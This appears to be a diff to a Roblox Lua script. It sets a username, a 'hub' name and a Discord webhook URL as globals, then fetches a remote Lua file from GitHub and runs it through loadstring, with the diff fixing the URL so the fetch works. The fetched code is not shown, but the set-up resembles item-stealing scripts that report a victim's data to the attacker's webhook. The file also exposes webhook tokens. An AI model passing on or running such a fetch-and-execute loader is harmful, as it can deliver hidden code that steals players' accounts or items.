@@ -1,5 +1,5 @@
-_G.Username "AvalonGodss"
-_G.HubName "BroLol"
-_G.WebhookUrl "https://discord.com/api/webhooks/1111268428246958090/r0n7uTZEsJG7Tz6vDAMM7xWERhlwdY2skqYBHdhOsLzAMbloc4gfPhAdIkkYG0D1iZnK"
+_G.Username = "AvalonGodss"
+_G.HubName = "MilkUP"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098172415063892039/spQHTeEMUW1W9QxyCC8vMMs4QXw4kL1ko_tu29jVLlDGvY6S3upTt5d-HeQCaxjWLYWJ"
 
-loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
